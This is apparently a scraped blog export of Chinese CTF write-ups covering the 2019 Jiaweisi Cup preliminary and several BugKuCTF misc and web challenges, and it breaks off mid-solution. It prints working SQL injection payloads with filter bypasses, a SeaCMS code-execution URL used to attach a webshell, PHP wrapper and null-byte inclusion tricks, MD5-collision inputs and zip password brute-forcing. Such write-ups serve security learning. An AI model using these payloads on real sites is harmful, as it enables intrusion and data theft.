初赛WriteUp","slug":"CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp","date":"2019-03-29T16:00:00.000Z","updated":"2019-04-24T16:37:56.180Z","comments":true,"path":"2019/03/30/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp/","link":"","permalink":"https://knlvre.github.io/2019/03/30/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp/","excerpt":"","text":"安恒WriteUp安恒2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp 官方WriteUp官方2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp 第一题（土肥原贤二）SQL注入，gid通过单引号包裹，比较简单就呈现出来 联合注入测试成功 爆数据库、表、列、flag值 -1&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=database() # -1&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;flag&#39; # -1&#39; union select 1,2,3,flag from flag # flag{ 20_welcome_19 } 第二题（吴佩孚）链接打开发现是Base64 拿去在线网站解密一下，得到jsfuck 直接放到Console，回车一下，flag就出来了 flag{sdf465454dfgert32} 第三题（死亡真相）下载下来一个wav文件，用Audacity打开看一下 点击左上角那一小块，选择”波频图”，可以看到有信息出来 但是加上下斜杠，提交时却是错的，官方特地说不是这个flag 既然缺少信息，就放到winhex里面看一下，在末尾发现zero字样 再看刚才的那串数字，想会不会是MD5，然后往空处补上0，刚好32位得到： 85a9d4517d47250b908cbc9fd0554216 拿去在线网站解密一下，拿到flag flag{hsd132456} 第四题（日军空袭）看到是Base64加密 内容提取出来，放到Notepad++里面解密一下，发现后面接了%3D %3D就是等号（=）的URL编码 判断是base64混合url循环编码，直接写个Python脚本解码 import base64 import urllib.parse s = &#39;Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1NHVkVRbUZXVmxsM1ZqQmFTMlJIVmtkWGJGcHBWa1phZVZadGVGWmxSbGw1Vkd0c2FsSnRhRzlVVm1oRFZWWmFkR05GZEZSTlZXdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbXRXTVhCRlZXeHdWMDFFUlRCV2Fra3hVakZhV0ZOcmFGWmlhMHBYV1d4b1UwMHhWWGhYYlhSWFRWWndNRlZ0ZUZOVWJVWTJVbFJDVjJFeVRYaFdSRVpyVTBaT2NscEhjRk5XUjNob1YxZDRiMVV4VWtkWGJrNVlZbGhTV0ZSV1pEQk9iR3hXVjJ4T1ZXSkdjRlpXYlhoelZqRmFObEZZYUZkU1JYQklWbXBHVDFkV2NFZGhSMnhUWVROQ1dsWXhXbXROUjFGNVZXNU9hbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKWVFrbFdiWEJIVkRGa1YyTkZaR2hTTW5oVVdWUk9RMWRzV1hoWGJYUk9VbTE0V0ZaWGRHdFdNV1JJWVVac1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5TUmxweFUydGFiRlpzU2xwWlZWcHJZVWRGZWxGcmJGZGlXRUpJVmtSS1UxWXhXblZWYldoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxkSFVsWlVWbHBIVFRGU2MxWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreU1VZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpyWWtad2VGVnRkREJWTWtwSVZXcENXbFpXY0hKWlZXUkdaVWRPU0U5V2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTVc5bGJHUllaVWM1YVUxWFVucFdNV2h2VjBkS1dWVnJPVlppVkVVd1ZqQmFZVmRIVWtoa1JtUnBWbGhDU2xkV1ZtOVVNVnAwVW01S1QxWnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYVFc1b1dGbFVRWGhUUmtweVdrWm9hV0Y2Vm5oV1ZFSnZVVEZzVjFWc1dsaGlWVnB6V1d0YWQyVkdWWGxrUjNSb1lsVndWMWx1Y0V0V2JGbDZZVVJPV21FeVVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFhZbXhhVjFsc2FFTldSbXhaWTBaa2EwMVdjREJaTUZZd1lWVXhXRlZyYUZkTmFsWlVWa2Q0UzFKc1pIVlRiRlpYWWtoQ05sWkhlR0ZaVm1SR1RsWmFVRlp0YUZSWmJGcExVMnhhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYlVaVlZteHdNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnNiRnBOTW1oWVZGWmFTMVZHY0VWU2EzQnNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdibEpzVTBkU2NGVnFRbmRXTVZsNVpFaGtWMDFFUmpGWlZWSlBWMjFGZVZWclpHRldNMmhJV1RKemVGWXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWVzVTVjJFeVVtaFZNRnBoVmpGc2MxcEVVbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaFhSbFp6WVVaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlXV3RvUTFkV1draGtSMFpvVFdzMWVsWXlOVk5oTVVsNVlVWm9XbFpGTlVSVk1WcHJWbFpHZEZKc1drNVdNVWwzVmxkNGIySXhXWGhhUldob1VtMW9WbFpzV25kTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRllaRmhpUmxweVdYcEdWbVZXVG5KYVIyaE9UVzFvV1ZaR1l6RlZNV1JIVjJ4V1UyRXhjSE5WYlRGVFYyeGtjbFpVUmxkTmEzQktWVmMxYjFZeFdqWlNWRUpoVWtWYWNsVnFTa3RUVmxKMFlVWk9hR1ZzV2pSV2JUQjRaV3N4V0ZadVRsaGlSMmh4V2xkNFlWWXhVbGRYYlVaWFZteHdlbGxWYUd0V2F6RldWbXBTVjJKWVFtaFdiVEZHWkRGYWRWUnNWbGRTVlhCVVYxZDBWbVF5VVhoV2JGSlhWMGhDVkZWV1RsWmxiRXBFVmxod1UxRlRWWHBTUTFWNlVrRWxNMFFsTTBRJTNE&#39; while True: while &#39;%&#39; in s: s = urllib.parse.unquote(s) try: s = base64.b64decode(s) #完成后，s变为byte类型 s = s.decode() #s转换成string类型，否则while处无法使用 except: break print s 果然可以得到flag 但是这个flag还经过栅栏密码处理，找个在线网站解密一下就可以：栅栏密码传送门 组数为5时得到我们的flag flag{B64_&amp;_2hai_14i} 第五题（飞虎队）Crypto — 希尔加密 关于解密过程：希尔加密WriteUp 矩阵行列式求法： 关于最小公倍数： 本题的WriteUp看前文提供的那2篇 第六题（戴星炳）算式的内容每2秒就会变，所以需要通过python的Session机制提交计算结果 代码如下： import requests,re from bs4 import BeautifulSoup a = requests.Session() url = &quot;http://47.103.43.235:82/web/a/index.php&quot; b = a.get(url) soup = BeautifulSoup(b.text,&#39;lxml&#39;) c = re.findall(&#39;&lt;p&gt;(.*)&lt;/p&gt;&#39;,str(soup.find_all(&#39;p&#39;)[1]))[0] result = eval(c) data = { &#39;result&#39;:result } d = a.post(url,data=data) print(d.text) 运行一下flag就出来了 flag{Y0U_4R3_3o_F4ST!} 第七题（大美晚报） 将这张二维码保存下来，用手机扫描没有可用信息。用winhex打开，发现有藏着zip文件 foremost直接提取出来一个zip文件。放入winhex中，将屁股后面多余的0删除掉 Ps：这里要记得删除屁股后面多余的0，不然注释信息显示不出来用foremost提取出来会多出很多0，用binwalk -e就不会，不知道为什么 尝试提取内容时，却发现是加密的。但是提示”管理员用了他的QQ号进行加密” 不知道管理员的QQ号，那就爆破，一般QQ号9位-11位，先从9位开始 Ps：这里的-u需要特地加上去，因为不加上去不以zip格式爆破 fcracker -b -c 1 -l 9 -v -u 文件名 输入密码，拿到文件，打开看到flag flag{Y0U_4R3_3o_F4ST!} 第八题（潘汉年） 做个简单的测试，将代码前4个字符和flag的ASCII码进行对比，代码如下： a = &quot;bg[`&quot; b = &quot;flag&quot; for i in range(4): print(&quot;密文:&quot;+ str(ord(a[i]))) print(&quot;========&quot;) print(&quot;flag:&quot;+ str(ord(b[i]))) print(&quot;&quot;) 发现逐位在漂移为 4 的基础上 + 1 根据这个还原flag，代码如下： a = &quot;bg[`sZ*Zg&#39;dPfP`VM_SXVd&quot; flag = &quot;&quot; for i in range(len(a)): flag += chr(ord(a[i])+4+i) print(flag) 拿到flag flag{c4es4r_variation} 第九题（袁殊）RSA 摸熟 n 过小，导致可被分解的问题，先用 openssl 提取公钥中的 e 和 n openssl rsa -pubin -text -modulus -in warmup -in gy.key Public-Key: (256 bit) Modulus: 00:a9:bd:4c:7a:77:63:37:0a:04:2f:e6:be:c7:dd: c8:41:60:2d:b9:42:c7:a3:62:d1:b5:d3:72:a4:d0: 89:12:d9 Exponent: 65537 (0x10001) Modulus=A9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 writing RSA key -----BEGIN PUBLIC KEY----- MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAKm9THp3YzcKBC/mvsfdyEFgLblCx6Ni 0bXTcqTQiRLZAgMBAAE= -----END PUBLIC KEY----- 在 factordb.com 分解 n 得到素因子 p 和 q， 解得私钥 d，再解得明文 m from Crypto.Util.number import * e = 65537 n = 0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9 p = 273821108020968288372911424519201044333 q = 280385007186315115828483000867559983517 phi = (p - 1) * (q - 1) assert GCD(e, phi) == 1 d = inverse(e, phi) c = open(&#39;E:\\\\Downloads\\\\CTF\\\\RSA256\\\\fllllllag.txt&#39;, &#39;rb&#39;).read() c = bytes_to_long(c) m = pow(c, d, n) print long_to_bytes(m) flag{_2o!9_CTF_ECUN_} 第十题（76号）Reverse 第十一题 （晴气庆胤）查看源代码，给出了提示 要POST值不同的2个数，但是md5的值却要一样，参考了这篇文章：不同数值构造相同MD5传送门 按照文章步骤来，创建文本文件，写入1，命令为init.txt 运行fastcoll 输入以下参数。 -p 是源文件 -o 是输出文件 fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt 文件生成 通过下面这个代码，生成两个hash一样，但是实际内容不一样的字符串： &lt;?php function readmyfile($path){ $fh = fopen($path, &quot;rb&quot;); $data = fread($fh, filesize($path)); fclose($fh); return $data; } echo &#39;二进制hash &#39;. md5( (readmyfile(&quot;1.txt&quot;))); echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; echo &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;1.txt&quot;)); echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;1.txt&quot;))); echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; echo &#39;二进制hash &#39;.md5( (readmyfile(&quot;2.txt&quot;))); echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; echo &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;2.txt&quot;)); echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;))); echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; 然后直接POST提交param1和param2 内容如下： param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B 拿下flag flag{MD5@_@success} 第十二题（梅津美治郎）Reverse 第十三题（冈村宁次）题目的链接如下： http://47.103.43.235:83/web/a/index.php?id===QM 发现”id=”后面是奇怪的”==QM”。这其实是1经过base64加密后再逆序 测试发现，以下内容被检查，无法使用： extractvalue()函数，updatexml()函数 union,select,空格,逗号,等号 应对策略： 双写：uunionnion,sselectelect 空格：使用/**/或者%09代替空格 逗号：select()a join select ()b来代替逗号 等号：like代替等号 爆表名： base64.b64encode(&quot;0 uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database())f)&quot;)[::-1] #表名：book,flag 爆列名： base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666c6167)f)&quot;)[::-1] #列名：flag 爆flag值： base64.b64encode(&quot;0/**/uunionnion/**/sselectelect/**/*/**/from/**/((sselectelect/**/database())a/**/join/**/(sselectelect/**/2)b/**/join/**/(sselectelect/**/3)c/**/join/**/(sselectelect/**/4)d/**/join/**/(sselectelect/**/5)e/**/join/**/(sselectelect/**/flag/**/from/**/flag)f)&quot;)[::-1] flag{s9li_1s_s0_e4sY} 第十四题（作战计划）之前看过海洋CMS v6.28 存在代码执行漏洞，参考文章后，菜刀直接连接，密码为1： http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1]) 根目录下直接看到flag.txt，打开后看到flag flag{!!seacms_@@} 第十五题（池步洲）查看源码，末尾提示着：index.phps，直接访问后下载到源码 源码如下： &lt;?php error_reporting(0); $flag = &#39;********&#39;; if (isset($_POST[&#39;name&#39;]) and isset($_POST[&#39;password&#39;])){ if ($_POST[&#39;name&#39;] == $_POST[&#39;password&#39;]) print &#39;name and password must be diffirent&#39;; else if (sha1($_POST[&#39;name&#39;]) === sha1($_POST[&#39;password&#39;])) die($flag); else print &#39;invalid password&#39;; } ?&gt; 可以看出，要求我们POST的name和password值要不同，但是sha1()后的值要相同 和md5()一样，sha1()无法处理数组，直接返回空，所以就是值一样了 用Burpsuits提交，直接返回flag flag{Y0u_just_br0ke_sha1}","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"BugKuCTF — 分析题(第1-9关)","slug":"BugKuCTF—分析题 第1-9关","date":"2019-03-28T16:00:00.000Z","updated":"2019-09-01T06:25:54.423Z","comments":true,"path":"2019/03/29/BugKuCTF—分析题 第1-9关/","link":"","permalink":"https://knlvre.github.io/2019/03/29/BugKuCTF—分析题 第1-9关/","excerpt":"","text":"第一关（flag被盗）用wireshark打开下载下来的文件，用协议顺序排序 先追踪一下HTTP协议（右击 —&gt; 追踪流 —&gt; HTTP） 搜索一下flag关键字，直接找到flag 第二关（中国菜刀）方法一（全Window环境）：用wireshark打开下载下来的文件。既然题目提示是中国菜刀，那应该是用到HTTP协议 按照协议排序之后，在第四个HTTP协议包里找到了一句话木马 在第四个HTTP协议包里挂马，那关键文件一定是在这之后才获取到的 在下一个HTTP包里追踪HTTP协议。红色部分是客户端向服务器发起的请求，蓝色部分是服务器回应客户端的内容 我们可以看到红色部分有一段BASE64的加密内容，拿去解密一下（注意：%3D解码成=号） 可以看到里面有flag.tar.gz关键文件，那应该是客户端向服务器拿走了这个文件 蓝色部分应该就是服务器将flag.tar.gz这个文件给了客户端的记录 第五个HTTP协议包是客户端的请求，第六个HTTP协议包就应该是服务器的回应了，并且里面有flag.tar.gz 怎么提取这个flag.tar.gz的内容呢，看了大佬写的文章，有两种方法： 方法1.1： 点击第六个HTTP协议包，”Line-based” —&gt; “右键” —&gt; “显示分组字节” 因为2个X@Y是菜刀特有的标记，我们提取信息时并不能把它们放进去 所以将开始位设置为3，结束位设置为206（整个数据是0到209） 然后解码为”压缩”，显示为”ASCII”就可以看到flag了 方法1.2： 还是那个地方，右键 —&gt; 导出分组字节（此处导出为1.tar.gz) 我们有讲过，菜刀会留下前后额X@Y，所以要主动删掉，不然是打不开压缩文件的 我用winhex，删除掉2个X@Y，并且保存 再次打开，就可以看到flag.txt，打开直接拿到flag了 至此，方法一结束 方法二（利用Kali）：Kali自带Wireshark，可以用命令打开这个包 也可以用binwalk看里面有什么东西可以提取 然后直接binwalk -e命令提取出来 binwalk -e caidao.pcapng 提取出来一个压缩包，解压得到flag.txt，查看后拿到flag tar -xvf 1E43 至此，方法二结束 第三关（怎么多数据包）下载下来一个CTF.pcapng和一个文件夹里面装着文件._CTF.pcapng 我们先打开CTF.pcapng，前面大部分是一些不需要的协议过程，直接跳过 然后发现有大量的TCP包，可以看出来都是192.168.116.138的主机向192.168.116.159发送SYN请求包（题外话：因为之前模拟过DOS攻击，所以着看看上去也有点像DOS攻击） 159的主机如果端口无法建立连接就会返回一个RST包，将这个连接断掉以避免占用资源 一直往下翻到No.2560条包，159主机的3389端口成功和138主机的端口建立了连接 我们追踪这个TCP流，内容较多。看一下、搜索flag之类的关键字，却什么都没有发现 往下还有135、139、445、1040端口建立连接，但是都没有找到有用的信息 终于快到结尾No.5542，1234端口和35880端口三次握手建立连接 追踪TCP流，找到了一串Base64加密的密文 用Python解密一下，直接拿到了flag 看了大佬的Writeup，其实这道题还有更简单的做法 因为题目提示”先找到getshell的流” 那说明最后还是拿到了shell，可以直接从后面开始找起 最后开始的话，先碰到1040端口的连接，没有信息跳过。这就来到了1234端口的连接，就可以较快地拿到flag 此题一共有2个文件，做完了发现另外一个好像没用，可能是干扰作用 第四关（手机热点）题目提示：没有流量，用手机发送了小秘密到电脑 既然没有流量，还能发送文件的就是蓝牙了 直接搜索蓝牙协议：obex。果然搜出了内容 注意到No.19394，有一个secret.rar文件 点击这条数据，再点击左上角的”文件” —&gt; “导出分组字节流”（快捷键ctrl+H），保存为1.rar 尝试解压失败。拿到winhex下看一下文件，发现文件头有错 因为rar文件头是： 52 61 72 21 将多余的部分删除掉，然后保存 再次解压1.rar，解压成功，提取出来一张GIF文件，图片上就是flag 不过这题还有更简单的方法。没错，还是用binwalk，直接提取出来图片 第五关（抓到一只苍蝇）本题参考这位大佬的文章：抓到一只苍蝇 用Wireshark打开，前2个TCP连接追踪无果，但是第3个连接追踪后发现有东西 从前面的内容来看，应该是通过QQ邮箱，用POST方法发送文件 客户端发送的内容末端发现了fly.rar，这不就是苍蝇吗 上图描述的是压缩包的内涵，也就是这样： { &quot;path&quot;:&quot;fly.rar&quot;, &quot;appid&quot;:&quot;&quot;, &quot;size&quot;:525701, &quot;md5&quot;:&quot;e023afa4f6579db5becda8fe7861c2d3&quot;, &quot;sha&quot;:&quot;ecccba7aea1d482684374b22e2e7abad2ba86749&quot;, &quot;sha3&quot;:&quot;&quot; } 记录了fly.rar的大小，md5值 现在添加对数据包的过滤条件，只看http协议，并且只看POST方法 http &amp;&amp; http.request.method == POST 注意到No.2至No.6这5个文件，Media Type都是application/octet-stream的格式 也就是数据流的格式，现在就猜测这些数据流里有我们要的东西 这5个文件的Media Type域的大小分别是131436、131436、131436、131436、1777 之前压缩包内涵中我们知道，fly.rar的大小是525701，那么： (131436*4 + 1777) - 525701 = 1820 1820 / 4 = 364 接触过网络数据包的应该知道，数据包如果拆开发送，到目标端是要再组合起来的 组合起来时就需要靠包头的信息，现在猜测364就是每个包的包头大小 用Wireshark的Ctrl+H将Media Type的内容提取出来，放到Kali中 用dd命令逐个将他们的前364个字节大小的包头剔除掉 dd if=1 of=10 skip=364 bs=1 用cat命令将5个和成1个fly.rar cat 10 20 30 40 50 &gt; fly.rar 用md5sum检查一下md5值。没错，和之间压缩包内涵里的md5值一模一样，说明组合成功了 md5sum fly.rar 想要解压时却发现要密码 放到winhex里看一下， 发现是伪加密，只需要将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密） 修改完直接可以解压，解压下来flag.txt 直接浏览时，发现又是一大堆十六进制，只能再用winhex打开看一下 提示我们程序要运行在win32环境下，那就把后缀改成.exe，运行一下 额。。。好多苍蝇，还好做题时女朋友不在，不然她可能会当场去世 都是骗人的，要粗暴点了，把这个程序binwalk一下，有藏着东西 foremost分离，分离出来的png文件夹里，有无数只苍蝇 但是 最后有一个二维码，手机扫一下，flag出来了 第六关（","categories":[],"tags":[{"name":"CTF-Misc","slug":"CTF-Misc","permalink":"https://knlvre.github.io/tags/CTF-Misc/"}],"author":"Knlvre"},{"title":"BugKuCTF — Web题(第21-30关)","slug":"BugKuCTF—Web题 第21-30关","date":"2019-03-27T16:00:00.000Z","updated":"2019-09-01T06:22:50.437Z","comments":true,"path":"2019/03/28/BugKuCTF—Web题 第21-30关/","link":"","permalink":"https://knlvre.github.io/2019/03/28/BugKuCTF—Web题 第21-30关/","excerpt":"","text":"前一部分链接：第11-20关Write-up 第二十一关（秋名山老司机）题目打开要求我们2秒内快速计算 就想到用Python的Session机制，思想是：自动抓取页面、计算、提交、保存Session、显示flag 那此时就会碰到一个问题，我们计算好的值，同哪个变量提交给服务器？ 此时，页面多刷新几次，机会看到提示：value变量 -写代码： import requests import re from bs4 import BeautifulSoup a = requests.Session() url = &#39;http://123.206.87.240:8002/qiumingshan/&#39; b = a.get(url) soup = BeautifulSoup(b.text,&#39;lxml&#39;) c = str(re.findall(&#39;&lt;div&gt;(.*)&lt;/div&gt;&#39;,str(soup.find_all(&#39;div&#39;))))[2:-5] result = eval(c) data = {&#39;value&#39;:result} d = a.post(url,data) print(d.text) 多执行几次，flag就跳出来 为什么要多执行几次呢？看了别人的WP：当计算结果超出一定长度时，服务器就不响应了。在此猜想：可能客户端 Python 脚本计算错误，也可能服务器端 PHP 脚本对大数计算有误差，还可能在 POST 请求过程中令大整数发生改变。至于是哪种，还请高手解答。 第二十二关（速度要快）题目进去提示：我感觉你得快点!!! 查看源代码：margin 使用Burpsuits发送GET请求包，返回的内容里有flag字段，是Base64加密 拿去Notepad++解密一下，还是经过Base64加密，需要再次解密才会变成数字 那么现在这个数字应该就是我们要的值，并且作为变量margin的值提交上去才行 写代码： import base64,requests a = requests.Session() url = &quot;http://123.206.87.240:8002/web6/&quot; b = a.get(url) b = b.headers[&#39;flag&#39;] c = str(base64.b64decode(b))[-9:-1] d = base64.b64decode(c) result = d.decode() data = {&#39;margin&#39;:result} flag = a.post(url,data=data) print(flag.text) 直接拿下flag 第二十三关（Cookies欺骗）链接进去后只看到一串一直重复的文字 但是注意到URL的filename字段后面接的是Base64密文，拿去解密一下是：key.txt 我们将index.php也经过Base64加密，放上去，然后将line参数调成1。嗯？有料 调成2、3试一下，也都有内容 那就直接写个脚本全部抓下来看 import requests,base64 s = &quot;index.php&quot; s = s.encode() s = base64.b64encode(s) s = s.decode() for i in range(30): i = str(i) url = &quot;http://123.206.87.240:8002/web11/index.php?line=&quot; + i + &quot;&amp;filename=&quot; + s r = requests.get(url) if(r.text): print(r.text[0:-2]) else: break 读取如下内容： &lt;?php error_reporting(0); $file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;); $line=isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0; if($file==&#39;&#39;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &#39;0&#39; =&gt;&#39;keys.txt&#39;, &#39;1&#39; =&gt;&#39;index.php&#39;, ); if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;){ $file_list[2]=&#39;keys.php&#39;; } if(in_array($file, $file_list)){ $fa = file($file); echo $fa[$line]; } ?&gt; 关于问号（?）的用法： [表达式] ? [结果1]:[结果2] //当表达式为True时，返回结果1;当表达式为False时，返回结果2 所以当Cookie中有margin，并且file的值为keys.php的Base64密文时，返回keys.php的值 Burpsuits提交，成功获得flag 第二十四关（Never give up）链接进去没有提示有用的信息，只显示”never never never give up !!!” 右键”查看网页源代码”，看到提示信息&lt;!--1p.html--&gt; 我们直接在view-source的后面改成1p.html就可以看到内容 内容显然是经过url编码和Base64加密的，那就直接复制到Notepad++里进行转换 对其中几个函数解释一下： stripos()： 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写），返回一个数字 eregi()： 用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则返回false 和 ereg() 完全相同，只除了在匹配字母字符时忽略大小写的区别 开始对源码中$id、$a、$b 三个变量需要满足的条件进行讲解 一、$id（弱类型比较） 变量 $id 若想满足非空非零，且弱等于整型数 0，则 $id 的值只能为非空非零字符串 我们随便设置一个值：$id=bugku，如下图： 二、$a（PHP伪协议） 源码中变量 $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流 在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。因此这里用伪协议 php:// 来访问输入输出的数据流，其中 php://input可以访问原始请求数据中的只读流。这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform! 三、$b（eregi()截断漏洞） CTF 题做多了就知道 ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。这个漏洞可以用url中空格的编码：%00来绕过 源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “%00”，即eregi(“111”,”1114”)，满足 “111”去匹配 “1114” 成功。因此，这里假设 $b = “%0012345”，才能满足以上三个条件 构造payload： ?id=Bugku&amp;&amp;a=php://input&amp;&amp;b=%0012345 //请求主体中提交字符串：bugku is a nice plateform! 成功拿下flag 不过此题还有一个更简单的做法。。。。 直接访问f4l2a3g.txt 第二十五关（welcome to bugkuctf）链接进去没有提示有用信息，只是提示：”you are not the number of bugku !” 查看源代码，看到了提示 看到file_get_contents()和include()想到之前的知识点，构造payload： ?txt=php://&amp;&amp;file=php://filter/read=convert.base64-encode//resource=hint.php //password变量好像暂时用不上，就先不传入了 //请求主体中提交字符串：welcome to the bugkuctf 将那串Base64拿去解码，得到如下内容 &lt;?php class Flag{//flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); } } } ?&gt; 现在，直接将$file变量改成flag.php是不行的，会返回一串乱码 没有思路后看别人的WriteUp，我们就按照之前的步骤看index.php的源代码 为什么是index.php呢 第一：因为这个页面通常是一个网站的关键页面，有重要信息 第二：在我们给$file变量添加内容后，返回hello friend!，在其他源代码没见过，所以可以猜测有其他内容 把获得的Base64密文拿去解密得到代码 &lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;不能现在就给你flag哦&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo &quot;you are not the number of bugku ! &quot;; } ?&gt; 观察代码，在第八行时利用了正则匹配，当检测到$file变量中含有flag关键字，返回不能现在就给你flag哦，这应该就是刚才我们得到的乱码。这样的话，$flie变量就不能含有flag才能执行else中的语句 使用include()来处理$file变量，将变量$password进行逆序列化，然后输出$password的值 回到通过hint.php获得的代码块，Flag类，看到里面有一个$file属性，并且有一个魔术方法_tostring()，这个方法的作用就是当调用实例化对象时就会自动执行_tostring()这个方法。简单来说创造一个这个类的对象就会调用这个方法。而在_tostring()中，会输出以字符串的形式输出$file，根据上面的这些条件，我们可以让$password为Flag类型，并且让FLAG中的$file就等于flag.php，这样我们就可以得到flag.php的内容了，不过要记得，前面$password进行了反序列化的操作，所以我们要先把它序列化。在本地写一个php脚本，来获取$password的值： &lt;?php class Flag{ public $file; } $test = 